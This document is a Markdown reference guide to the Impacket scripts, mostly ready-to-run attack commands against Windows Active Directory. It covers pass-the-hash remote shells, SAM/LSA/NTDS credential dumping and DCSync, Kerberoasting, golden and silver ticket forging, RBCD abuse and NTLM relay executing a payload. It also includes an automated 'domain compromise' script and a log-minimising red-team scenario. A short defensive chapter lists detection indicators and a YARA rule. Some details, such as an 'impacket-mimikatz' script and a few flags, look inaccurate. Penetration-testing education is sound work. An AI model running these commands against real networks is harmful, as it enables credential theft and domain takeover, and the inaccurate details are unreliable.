---
tool_name: "impacket-scripts"
display_name: "Impacket Scripts"
mitre_tactic: "defense_evasion"
mitre_tactic_id: "TA0005"
mitre_subcategory: "pass_the_hash"
install_command: "sudo apt install impacket-scripts"
version: "1.1"
github_repo: "https://github.com/fortra/impacket"
kali_tools_page: "https://www.kali.org/tools/impacket-scripts/"
difficulty_level: "intermediate-to-advanced"
requires_root: false
gui_available: false
tags: ["network-protocols", "smb", "kerberos", "pass-the-hash", "lateral-movement", "active-directory"]
related_tools: ["crackmapexec", "evil-winrm", "freerdp"]
---

# Impacket Scripts

## Chapter 1: Introduction & Overview

### What are Impacket Scripts?

Impacket Scripts are a collection of Python-based network protocol tools built on the Impacket library. They provide offensive capabilities for interacting with Windows network protocols including SMB, MSRPC, Kerberos, LDAP, MSSQL, and WMI. The scripts cover authentication, enumeration, lateral movement, credential extraction, and protocol exploitation.

### History & Background

- **Created:** Originally by SecureAuth (Core Security)
- **Maintained:** Fortra (formerly SecureAuth)
- **License:** Modified Apache License
- **Purpose:** Network protocol interaction for security testing

Impacket is one of the most important Python libraries in offensive security. The `impacket-scripts` package in Kali provides pre-installed executable scripts that wrap the library's functionality.

### When to Use This Tool

- **Authentication testing:** Kerberos attacks (Kerberoasting, AS-REP Roasting)
- **Lateral movement:** Pass-the-hash, pass-the-ticket execution
- **Credential extraction:** SAM, LSA, NTDS dumping
- **Enumeration:** AD user, computer, and service enumeration
- **Protocol exploitation:** NTLM relay, SMB attacks

### Key Concepts

- **Pass-the-Hash:** Authenticate using NTLM hash without cleartext password
- **Pass-the-Ticket:** Authenticate using Kerberos tickets
- **Kerberoasting:** Extract service ticket hashes for offline cracking
- **AS-REP Roasting:** Attack accounts without pre-authentication
- **NTLM Relay:** Forward NTLM authentication to other services

### Available Scripts Overview

| Script | Purpose |
|--------|---------|
| psexec | Remote execution via SMB |
| wmiexec | Remote execution via WMI |
| smbexec | Semi-interactive shell via SMB |
| atexec | Remote execution via Task Scheduler |
| dcomexec | Remote execution via DCOM |
| secretsdump | Extract credentials (SAM, LSA, NTDS) |
| smbclient | SMB client for file operations |
| getTGT | Request Kerberos TGT |
| getST | Request Kerberos service ticket |
| kerberoast | Kerberoasting attack |
| getNPUsers | AS-REP Roasting |
| ntlmrelayx | NTLM relay attacks |
| ticketer | Create Kerberos tickets |
| mimikatz | Remote mimikatz execution |
| addcomputer | Add computer account to domain |

---

## Chapter 2: Installation & Setup

### System Requirements

- **OS:** Kali Linux, Ubuntu, Debian, or any Linux with Python 3
- **Python:** 3.9 or higher
- **RAM:** 512 MB minimum
- **Disk Space:** ~30 MB

### Installation Methods

#### Method 1: APT (Recommended)

```bash
sudo apt update && sudo apt install impacket-scripts
```

**Explanation:** Installs the Impacket scripts package from Kali's repositories.

#### Method 2: Pipx

```bash
python3 -m pipx install impacket
```

**Explanation:** Installs Impacket in an isolated Python environment, preventing dependency conflicts.

#### Method 3: From Source

```bash
git clone https://github.com/fortra/impacket.git
cd impacket
python3 -m pipx install .
```

**Explanation:** Building from source ensures the latest version with all recent updates.

### Verify Installation

```bash
impacket-psexec --version
impacket-secretsdump --help
```

**Explanation:** Confirms Impacket scripts are installed and operational.

### Dependencies

```
python3-dnspython
python3-dsinternals
python3-impacket
python3-ldap3
python3-ldapdomaindump
python3-pcapy
```

**Explanation:** These Python packages provide DNS, LDAP, and packet capture capabilities.

---

## Chapter 3: Basic Usage

### Authentication Methods

Impacket scripts support multiple authentication methods:

```bash
# Password authentication
impacket-psexec contoso.com/admin:Password123@192.168.1.100

# Pass-the-hash
impacket-psexec contoso.com/admin:'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'@192.168.1.100

# Kerberos authentication
impacket-psexec -k -no-pass contoso.com/admin@dc1.contoso.com
```

**Explanation:** Impacket uses a unified target format: `domain/user:password@target`.

### Remote Execution Scripts

#### PsExec

```bash
impacket-psexec contoso.com/admin:Password123@192.168.1.100
```

**Explanation:** Provides SYSTEM-level remote shell via SMB. Installs a service, executes commands, and provides an interactive shell.

#### WMIExec

```bash
impacket-wmiexec contoso.com/admin:Password123@192.168.1.100
```

**Explanation:** Executes commands via WMI. Provides a semi-interactive shell with less noise than PsExec.

#### SMBExec

```bash
impacket-smbexec contoso.com/admin:Password123@192.168.1.100
```

**Explanation:** Semi-interactive shell via SMB. Does not require service installation.

#### AtExec

```bash
impacket-atexec contoso.com/admin:Password123@192.168.1.100 "whoami"
```

**Explanation:** Executes commands via Task Scheduler. Useful when other methods are blocked.

#### DCOMExec

```bash
impacket-dcomexec contoso.com/admin:Password123@192.168.1.100
```

**Explanation:** Executes commands via DCOM objects (ShellWindows, ShellBrowserWindow, MMC20).

### Credential Extraction

#### SecretsDump

```bash
# Local SAM dump
impacket-secretsdump contoso.com/admin:Password123@192.168.1.100

# DCSync (requires domain admin)
impacket-secretsdump contoso.com/admin:Password123@192.168.1.100 -just-dc

# DCSync specific user
impacket-secretsdump contoso.com/admin:Password123@192.168.1.100 -just-dc-user krbtgt
```

**Explanation:** SecretsDump extracts SAM database, LSA secrets, cached credentials, and performs DCSync attacks.

### SMB Operations

#### SMBClient

```bash
# List shares
impacket-smbclient contoso.com/admin:Password123@192.168.1.100

# Download file
impacket-smbclient contoso.com/admin:Password123@192.168.1.100 -use-smb2 -Command "cd share; get file.txt"

# Upload file
impacket-smbclient contoso.com/admin:Password123@192.168.1.100 -Command "cd share; put payload.exe"
```

**Explanation:** SMBClient provides interactive SMB access for file operations.

---

## Chapter 4: Intermediate Usage

### Kerberos Attacks

#### Get TGT

```bash
# Request TGT with password
impacket-getTGT contoso.com/admin:Password123

# Request TGT with hash
impacket-getTGT contoso.com/admin:'LM:NT'

# Save to ccache
impacket-getTGT contoso.com/admin:Password123 -dc-ip 192.168.1.1 -ccache admin.ccache
```

**Explanation:** GetTGT requests a Ticket Granting Ticket for Kerberos authentication.

#### Get Service Ticket (Kerberoasting)

```bash
# Request SPN ticket
impacket-getST -spn cifs/dc1.contoso.com contoso.com/admin:Password123

# Request and save
impacket-getST -spn cifs/dc1.contoso.com -dc-ip 192.168.1.1 \
  contoso.com/admin:Password123 -save
```

**Explanation:** GetST requests service tickets for offline cracking.

#### Kerberoasting

```bash
# Enumerate SPNs and extract tickets
impacket-GetUserSPNs contoso.com/admin:Password123 -request

# Save to file
impacket-GetUserSPNs contoso.com/admin:Password123 -request -outputfile kerberoast.txt
```

**Explanation:** Kerberoasting extracts service ticket hashes for offline password cracking.

#### AS-REP Roasting

```bash
# Find accounts without pre-auth
impacket-GetNPUsers contoso.com/ -usersfile users.txt -no-pass

# Request AS-REP
impacket-GetNPUsers contoso.com/admin:Password123 -request -outputfile asrep.txt
```

**Explanation:** AS-REP Roasting targets accounts that don't require Kerberos pre-authentication.

### Domain Enumeration

#### GetADUsers

```bash
# Enumerate domain users
impacket-GetADUsers contoso.com/admin:Password123

# All users including disabled
impacket-GetADUsers contoso.com/admin:Password123 -all

# Specific user
impacket-GetADUsers contoso.com/admin:Password123 -user jsmith
```

**Explanation:** GetADUsers queries Active Directory for user account information.

#### GetADComputers

```bash
# Enumerate domain computers
impacket-GetADComputers contoso.com/admin:Password123

# Resolve IPs
impacket-GetADComputers contoso.com/admin:Password123 -resolveIP
```

**Explanation:** GetADComputers queries Active Directory for computer account information.

#### FindDelegation

```bash
# Find delegation relationships
impacket-findDelegation contoso.com/admin:Password123
```

**Explanation:** FindDelegation identifies Kerberos delegation configurations that can be exploited.

### Ticket Operations

#### Ticket Converter

```bash
# Convert ccache to kirbi
impacket-ticketConverter ticket.ccache ticket.kirbi

# Convert kirbi to ccache
impacket-ticketConverter ticket.kirbi ticket.ccache
```

**Explanation:** TicketConverter switches between Kerberos ticket formats.

#### Describe Ticket

```bash
# Analyze ticket contents
impacket-describeTicket ticket.ccache

# With decryption key
impacket-describeTicket ticket.ccache --rc4 <NT_HASH>
```

**Explanation:** DescribeTicket parses and displays ticket contents including PAC information.

#### Create Tickets (Ticketer)

```bash
# Create golden ticket
impacket-ticketer -nthash <KRBTGT_HASH> -domain contoso.com \
  -domain-sid S-1-5-21-... Administrator

# Create silver ticket
impacket-ticketer -nthash <SERVICE_HASH> -domain contoso.com \
  -spn cifs/dc1.contoso.com Administrator
```

**Explanation:** Ticketer creates forged Kerberos tickets for persistent access.

### NTLM Relay

```bash
# Start relay server
impacket-ntlmrelayx -t 192.168.1.200 -smb2support

# With SOCKS proxy
impacket-ntlmrelayx -t 192.168.1.200 -socks

# With SAM dump
impacket-ntlmrelayx -t 192.168.1.200 -smb2support --dump-lsa
```

**Explanation:** NTLM relay forwards captured NTLM authentication to other services.

---

## Chapter 5: Advanced Usage

### Advanced Attack Techniques

#### DCSync Attack

```bash
# Full DCSync
impacket-secretsdump contoso.com/admin:Password123@192.168.1.1 -just-dc

# Specific user DCSync
impacket-secretsdump contoso.com/admin:Password123@192.168.1.1 -just-dc-user krbtgt

# DCSync with hash (no password)
impacket-secretsdump contoso.com/admin:'LM:NT'@192.168.1.1 -just-dc
```

**Explanation:** DCSync replicates Active Directory data, extracting all domain credentials.

#### Golden Ticket

```bash
# 1. Get krbtgt hash via DCSync
impacket-secretsdump contoso.com/admin:Password123@dc1.contoso.com -just-dc-user krbtgt

# 2. Create golden ticket
impacket-ticketer -nthash <krbtgt_NThash> -domain contoso.com \
  -domain-sid S-1-5-21-... Administrator

# 3. Use ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass contoso.com/Administrator@dc1.contoso.com
```

**Explanation:** Golden tickets provide persistent domain access using the krbtgt hash.

#### Silver Ticket

```bash
# 1. Get service account hash
impacket-secretsdump contoso.com/admin:Password123@dc1.contoso.com -just-dc-user cifs

# 2. Create silver ticket for CIFS
impacket-ticketer -nthash <cifs_NThash> -domain contoso.com \
  -spn cifs/dc1.contoso.com -domain-sid S-1-5-21-... Administrator

# 3. Use ticket for SMB access
impacket-smbclient -k -no-pass contoso.com/Administrator@dc1.contoso.com
```

**Explanation:** Silver tickets provide access to specific services without touching the DC.

#### Unconstrained Delegation Abuse

```bash
# Find unconstrained delegation
impacket-findDelegation contoso.com/admin:Password123

# Capture TGTs
impacket-ticketer -nthash <hash> -domain contoso.com \
  -spn cifs/dc1.contoso.com Administrator
```

**Explanation:** Unconstrained delegation stores TGTs that can be extracted and reused.

#### RBCD Attack

```bash
# Add machine account
impacket-addcomputer contoso.com/admin:Password123 -computer-name 'FAKE01$' -computer-pass 'Password123'

# Set RBCD
impacket-rbcd contoso.com/admin:Password123 -delegate-from 'FAKE01$' -delegate-to 'TARGET01$' -action write

# Get service ticket
impacket-getST -spn cifs/TARGET01 -impersonate administrator \
  contoso.com/'FAKE01$':'Password123'
```

**Explanation:** Resource-Based Constrained Delegation attacks abuse write permissions on msDS-AllowedToActOnBehalfOfOtherIdentity.

### Integration with Other Tools

#### With CrackMapExec

```bash
# Find valid credentials
crackmapexec smb 192.168.1.0/24 -u admin -p password

# Use with Impacket
impacket-psexec contoso.com/admin:password@192.168.1.100
```

**Explanation:** CrackMapExec finds credentials, Impacket uses them for exploitation.

#### With Evil-WinRM

```bash
# Extract hash with Impacket
impacket-secretsdump contoso.com/admin:password@192.168.1.100 -just-dc-user krbtgt

# Use with Evil-WinRM
evil-winrm -i 192.168.1.100 -u admin -H 'LM:NT'
```

**Explanation:** Combine Impacket for credential extraction with Evil-WinRM for interactive shell.

#### With Hashcat

```bash
# Extract hashes
impacket-GetUserSPNs contoso.com/admin:Password123 -request -outputfile hashes.txt

# Crack with hashcat
hashcat -m 13100 hashes.txt wordlist.txt
```

**Explanation:** Impacket extracts hashes, Hashcat cracks them offline.

### Automation Scripts

#### Full Domain Compromise Script

```bash
#!/bin/bash
DOMAIN="contoso.com"
USER="admin"
PASS="Password123"
DC="192.168.1.1"

echo "[*] Enumerating domain users..."
impacket-GetADUsers ${DOMAIN}/${USER}:${PASS} -all > users.txt

echo "[*] Enumerating domain computers..."
impacket-GetADComputers ${DOMAIN}/${USER}:${PASS} > computers.txt

echo "[*] Finding delegation..."
impacket-findDelegation ${DOMAIN}/${USER}:${PASS} > delegation.txt

echo "[*] Attempting Kerberoasting..."
impacket-GetUserSPNs ${DOMAIN}/${USER}:${PASS} -request -outputfile kerberoast.txt

echo "[*] Attempting DCSync..."
impacket-secretsdump ${DOMAIN}/${USER}:${PASS}@${DC} -just-dc > dcsync.txt

echo "[+] Reconnaissance complete"
```

**Explanation:** Automated domain reconnaissance script using Impacket tools.

#### Python Wrapper

```python
#!/usr/bin/env python3
import subprocess
import sys

def run_impacket(script, target, creds, options=""):
    cmd = f"impacket-{script} {creds}@{target} {options}"
    print(f"[*] Running: {cmd}")
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"[-] Error: {result.stderr}")
    return result.stdout

# Usage
domain = "contoso.com"
user = "admin"
password = "Password123"
target = "192.168.1.100"

creds = f"{domain}/{user}:{password}"

# Dump SAM
sam_output = run_impacket("secretsdump", target, creds, "--sam")
print(sam_output)
```

**Explanation:** Python wrapper for automating Impacket operations.

---

## Chapter 6: Real-World Scenarios

### Scenario 1: CTF Challenge

**Objective:** Compromise a Windows domain

**Steps:**

```bash
# 1. Enumerate domain
impacket-GetADUsers contoso.com/guest:guest@192.168.1.1
impacket-GetADComputers contoso.com/guest:guest@192.168.1.1

# 2. Kerberoast
impacket-GetUserSPNs contoso.com/guest:guest@192.168.1.1 -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# 3. Use cracked password
impacket-psexec contoso.com/service:cracked_password@192.168.1.100

# 4. Dump domain
impacket-secretsdump contoso.com/service:cracked_password@192.168.1.100 -just-dc
```

**Explanation:** Standard CTF workflow from enumeration to domain compromise.

### Scenario 2: Penetration Test

**Objective:** Full domain compromise

**Steps:**

```bash
# 1. Initial access with found credentials
impacket-wmiexec contoso.com/admin:Password123@192.168.1.100

# 2. Extract credentials
impacket-secretsdump contoso.com/admin:Password123@192.168.1.100

# 3. Lateral movement
impacket-psexec contoso.com/admin:'LM:NT'@192.168.1.200

# 4. DCSync
impacket-secretsdump contoso.com/admin:Password123@dc1.contoso.com -just-dc

# 5. Create golden ticket
impacket-ticketer -nthash <krbtgt_hash> -domain contoso.com Administrator
```

**Explanation:** Complete penetration test from initial access to domain persistence.

### Scenario 3: Red Team Operation

**Objective:** Covert domain compromise

**Steps:**

```bash
# 1. Use Kerberos to avoid password logging
impacket-getTGT contoso.com/admin:Password123 -ccache admin.ccache
export KRB5CCNAME=admin.ccache

# 2. Execute via WMI (less noisy)
impacket-wmiexec -k -no-pass contoso.com/Administrator@dc1.contoso.com

# 3. DCSync with Kerberos
impacket-secretsdump -k -no-pass contoso.com/Administrator@dc1.contoso.com -just-dc

# 4. Create golden ticket for persistence
impacket-ticketer -nthash <krbtgt_hash> -domain contoso.com -domain-sid S-1-5-21-... Administrator
```

**Explanation:** Covert red team operation using Kerberos to minimize log entries.

### Scenario 4: NTLM Relay Attack

**Objective:** Relay captured NTLM authentication

**Steps:**

```bash
# 1. Start relay server
impacket-ntlmrelayx -t 192.168.1.200 -smb2support -e payload.exe

# 2. Trigger authentication (e.g., via Responder or PetitPotam)
# 3. Relay executes payload on target

# 4. Alternative: dump credentials
impacket-ntlmrelayx -t 192.168.1.200 -smb2support --dump-lsa
```

**Explanation:** NTLM relay captures and forwards authentication to execute commands or dump credentials.

---

## Chapter 7: Detection & Defense

### How Defenders Detect Impacket

#### Network Indicators

- **SMB traffic:** Unusual SMB operations (service creation, file writes)
- **Kerberos anomalies:** Unusual TGS requests, ticket forging patterns
- **NTLM relay:** Unusual NTLM authentication forwarding
- **RPC traffic:** Abnormal MSRPC calls

#### Host-Based Indicators

- **Service creation:** New services created by PsExec/SMBExec
- **Scheduled tasks:** Tasks created by AtExec
- **WMI activity:** Unusual WMI process creation
- **Credential dumping:** Access to SAM/LSA/NTDS

#### Detection Rules

```yaml
# YARA rule for Impacket artifacts
rule impacket_psexec {
    strings:
        $s1 = "PSEXESVC" ascii
        $s2 = "Impacket" ascii
    condition:
        any of them
}
```

**Explanation:** YARA rules can detect Impacket artifacts in memory and on disk.

### Mitigation Strategies

#### Preventive Controls

1. **Disable NTLM:** Use Kerberos-only authentication
2. **Enable SMB signing:** Prevent NTLM relay
3. **Implement LAPS:** Rotate local admin passwords
4. **Restrict admin access:** Tiered administration model

#### Detective Controls

1. **Monitor service creation:** Event ID 7045 (new service)
2. **Track scheduled tasks:** Event ID 4698 (task created)
3. **Monitor WMI activity:** Event ID 19/20/21 (WMI)
4. **Detect credential dumping:** Event IDs 4656, 4663 (SAM access)

### Blue Team Response

1. **Enable SMB signing** on all systems
2. **Implement Protected Users** security group
3. **Deploy Windows Defender ATP** with behavioral detection
4. **Monitor for DCSync** using Event IDs 4662, 4624
5. **Implement tiered administration** to limit credential exposure

---

## Chapter 8: Troubleshooting

### Common Errors

#### Error: "Connection refused"

**Cause:** Service not running or firewall blocking

**Solution:**

```bash
# Check if service is accessible
nmap -p 445 192.168.1.100
nmap -p 135 192.168.1.100

# Try different authentication
impacket-psexec contoso.com/admin:Password123@192.168.1.100 -debug
```

**Explanation:** Debug mode provides detailed output for troubleshooting connection issues.

#### Error: "Access denied"

**Cause:** Insufficient privileges or incorrect credentials

**Solution:**

```bash
# Verify credentials
crackmapexec smb 192.168.1.100 -u admin -p password

# Try different authentication method
impacket-psexec contoso.com/admin:'LM:NT'@192.168.1.100
```

**Explanation:** Different authentication methods may have different permission requirements.

#### Error: "Kerberos authentication failed"

**Cause:** Time skew or ticket issues

**Solution:**

```bash
# Sync time
rdate -n 192.168.1.1

# Verify ticket
klist

# Renew ticket
impacket-getTGT contoso.com/admin:Password123
```

**Explanation:** Kerberos requires time synchronization and valid tickets.

#### Error: "No module named 'impacket'"

**Cause:** Impacket not installed or wrong Python version

**Solution:**

```bash
# Check Python version
python3 --version

# Reinstall Impacket
pip3 install impacket

# Or use pipx
python3 -m pipx install impacket
```

**Explanation:** Impacket requires Python 3.9+ and proper package installation.

### FAQ

**Q: What's the difference between Impacket and CrackMapExec?**
A: Impacket provides low-level protocol interaction and individual attack scripts. CrackMapExec is a high-level network pentesting tool with credential testing and enumeration.

**Q: Can Impacket scripts be used with Kerberos?**
A: Yes. Use `-k` flag for Kerberos authentication. Set `KRB5CCNAME` environment variable for ticket files.

**Q: How do I use Impacket with pass-the-hash?**
A: Use the target format: `domain/user:'LM:NT'@target`.

**Q: Are Impacket scripts stealthy?**
A: Some are (WMIExec, DCOMExec). Others (PsExec) create services that are easily detected. Use logging and monitoring to track usage.

**Q: Can Impacket work in Python 2?**
A: No. Impacket requires Python 3.9 or higher.

---

## Resources

### Official Documentation

- [Impacket GitHub](https://github.com/fortra/impacket)
- [Impacket Wiki](https://github.com/fortra/impacket/wiki)
- [Kali Linux Impacket Scripts](https://www.kali.org/tools/impacket-scripts/)

### Tutorials

- [Impacket Usage Guide - HackTricks](https://book.hacktricks.xyz/)
- [Active Directory Attacks - The Hacker Recipes](https://www.thehacker.recipes/ad/movement)
- [OffSec PEN-200 Course](https://www.offsec.com/courses/pen-200/)

### Related Tools

- **CrackMapExec:** Network pentesting tool
- **Evil-WinRM:** WinRM shell
- **FreeRDP:** RDP client
- **Responder:** LLMNR/NBT-NS poisoner

### Practice Resources

- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [VulnHub](https://www.vulnhub.com/)
